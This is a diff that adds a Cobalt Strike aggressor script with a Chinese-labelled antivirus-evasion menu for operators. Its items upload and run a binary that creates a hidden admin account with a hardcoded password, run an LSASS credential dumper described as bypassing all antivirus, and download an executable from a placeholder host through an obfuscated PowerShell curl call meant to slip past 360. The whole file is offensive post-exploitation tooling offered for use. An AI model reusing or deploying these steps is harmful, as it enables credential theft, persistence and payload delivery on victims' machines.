@@ -1,0 +1,92 @@
+menu "免杀工具" {
+    {
+    
+    
+    item "绕过杀毒软件添加账号密码" {
+        blog($1, "账号：admins 密码：P@ssword233");
+       
+
+        bupload($1, script_resource("/script/ac.exe"));
+
+        bmv($1, "ac.exe", "C:\\Users\\Administrator\\Desktop\\ac.exe");
+
+        bshell($1,"C:\\Users\\Administrator\\Desktop\\ac.exe");
+
+
+        }
+
+
+
+           
+    item "dumplsass_64账号密码" {
+        blog($1, "绕过市面上所有杀毒软件直接dump账号密码");
+       
+
+        bupload($1, script_resource("/script/lsass_64.exe"));
+
+        bmv($1, "lsass_64.exe", "C:\\Users\\Administrator\\Desktop\\lsass_64.exe");
+
+        bshell($1,"C:\\Users\\Administrator\\Desktop\\lsass_64.exe");  
+
+
+        }
+        
+
+
+    
+
+
+
+
+
+
+    item "绕过360任意下载"{
+        $bid    = $1['@'];
+        $Dialog = dialog("运行",%(command => "http://xxx.com/xx.exe -o xx.exe",bid => $bid),&netview_run);
+        drow_text($Dialog, "command", "command: ");
+        dbutton_action($Dialog, "运行");
+        dialog_show($Dialog); }
+
+    sub netview_run{
+    local('$Name');
+    $Name = $3['command'];
+    bshell($bid, "powershell cu''rl   $+ $Name");
+    
+                
+
+
+
+       }
+       }
+
+
+        
+
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
